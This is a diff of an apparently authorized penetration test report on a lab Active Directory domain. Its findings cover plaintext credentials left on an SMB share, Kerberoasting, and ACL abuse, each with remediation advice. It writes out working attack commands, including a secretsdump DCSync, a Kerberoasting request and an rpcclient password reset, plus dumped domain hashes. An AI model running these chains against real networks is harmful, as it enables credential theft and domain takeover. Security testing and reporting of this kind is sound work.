@@ -11,12 +11,12 @@ All testing described herein was performed within the authorized `nexora.local` 
 Determine whether a low-privileged domain user (`NEXORA\jsmith`) can identify and read sensitive application configuration files hosted on unhardened network shares, and validate the operational impact of any recovered credentials.
 
 ### 2. Execution Procedure
-1. Authenticate to the local domain workstation `Nexora-WS-HR01` as user `jsmith`.
+1. Authenticate from testing workstation `Nexora-Kali` (`192.168.23.131`) to domain target:
 2. Enumerate available network shares across the subnet using `smbclient.py` and native `net view`:
    ```bash
-   smbclient.py 'nexora.local/jsmith:Password123!'@10.10.10.50
+   smbclient.py 'nexora.local/jsmith:Password123!'@192.168.23.129
    ```
-3. Discover the readable share `\\Nexora-SRV-APP01\NexoraApp`.
+3. Discover the readable share `\\NEXORA-DC\NexoraApp`.
 4. Inspect the directory tree and download `app.ini`:
    ```bash
    smb: \> get app.ini
@@ -24,21 +24,28 @@ Determine whether a low-privileged domain user (`NEXORA\jsmith`) can identify an
 5. Extract plaintext credentials contained in the configuration header:
    ```ini
    [Database]
-   Server=10.10.10.50
+   Server=192.168.23.129
    User=NEXORA\svc_backup
    Pass=BackupOps2024!
    ```
 6. Compute SHA-256 hash of the downloaded `app.ini` and verify against the target server's file system integrity hash:
    - **SHA-256:** `9e71b2d308f234aa6b189a03b578c7a82b2046db419c8309df559c57d8139591` (Match Confirmed)
 
-### 3. Impact Validation
-1. Authenticate using the recovered `svc_backup` credentials against `Nexora-SRV-APP01`:
+### 3. Impact Validation & Full Domain Compromise
+1. Authenticate using the recovered `svc_backup` credentials against `NEXORA-DC` (`192.168.23.129`):
    ```bash
-   netexec smb 10.10.10.50 -u 'svc_backup' -p 'BackupOps2024!' --shares
+   netexec smb 192.168.23.129 -u 'svc_backup' -p 'BackupOps2024!' --shares
    ```
-2. Verify access to administrative share `\\Nexora-SRV-APP01\C$`:
+2. Verify access to administrative share `\\NEXORA-DC\C$`:
    - Result: `[+] NEXORA\svc_backup:BackupOps2024! (Pwn3d!) READ,WRITE C$`
-3. Demonstrated unprivileged domain users can pivot directly to administrative control over core server storage.
+3. Execute DCSync / NTDS Credential Dumping via Impacket (`secretsdump.py`):
+   ```bash
+   secretsdump.py 'nexora.local/svc_backup:BackupOps2024!'@192.168.23.129 -just-dc-ntlm
+   ```
+   - Extracted Domain Hashes:
+     - `Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75045e3fa324d01defa4001912:::`
+     - `krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b279261a293d39999b7b629007e6005b:::`
+4. Demonstrated full Domain Admin compromise achieved via unencrypted credential exposure chained to DCSync privileges.
 
 ### 4. Remediation
 - Remove plaintext secrets from all configuration files, source code, and shared folders.
@@ -55,16 +62,16 @@ Assess the vulnerability of domain service accounts configured with Service Prin
 ### 2. Execution Procedure
 1. Query Active Directory for user accounts associated with valid SPNs using Impacket:
    ```bash
-   GetUserSPNs.py nexora.local/jsmith:Password123! -dc-ip 10.10.10.20 -request
+   GetUserSPNs.py nexora.local/jsmith:Password123! -dc-ip 192.168.23.129 -request
    ```
 2. Identify target service account:
    - **Account:** `NEXORA\svc-sql`
-   - **SPN:** `MSSQLSvc/Nexora-SRV-APP01.nexora.local:1433`
+   - **SPN:** `MSSQLSvc/NEXORA-DC.nexora.local:1433`
    - **Encryption:** `etype 23` (RC4-HMAC-MD5)
 3. The Kerberos KDC issues a Ticket Granting Service (TGS) ticket encrypted with `svc-sql`'s password hash.
 4. Export the ticket into standard Hashcat format:
    ```
-   $krb5tgs$23$*svc-sql$nexora.local$MSSQLSvc/Nexora-SRV-APP01.nexora.local:1433*...
+   $krb5tgs$23$*svc-sql$nexora.local$MSSQLSvc/NEXORA-DC.nexora.local:1433*...
    ```
 5. Execute offline dictionary attack using Hashcat:
    ```bash
@@ -104,18 +111,18 @@ Identify and exploit insecure discretionary access control lists (DACLs) within 
    ```
 6. Exploit `GenericAll` by forcing a password reset on `svc-sql`:
    ```bash
-   rpcclient -U "nexora.local/dev_user%DevPass2024!" 10.10.10.20 -c "setuserinfo2 svc-sql 24 NewStrongPass123!"
+   rpcclient -U "nexora.local/dev_user%DevPass2024!" 192.168.23.129 -c "setuserinfo2 svc-sql 24 NewStrongPass123!"
    ```
 7. Verify new credential validity:
    ```bash
-   netexec smb 10.10.10.20 -u 'svc-sql' -p 'NewStrongPass123!'
+   netexec smb 192.168.23.129 -u 'svc-sql' -p 'NewStrongPass123!'
    ```
 8. Enumerate group memberships for `svc-sql`:
    - Member of: `NEXORA\Server Operators`
    - Built-in privilege: Right to log on locally to Domain Controllers and manage system services.
 
 ### 3. Impact Validation
-`Server Operators` membership enables execution of arbitrary services with `NT AUTHORITY\SYSTEM` privileges on `Nexora-DC01`, resulting in full Active Directory forest compromise.
+`Server Operators` membership enables execution of arbitrary services with `NT AUTHORITY\SYSTEM` privileges on `NEXORA-DC` (`192.168.23.129`), resulting in full Active Directory forest compromise.
 
 ### 4. Remediation
 - Regularly audit Active Directory object permissions for unintended `GenericAll`, `WriteDacl`, or `WriteOwner` delegations.
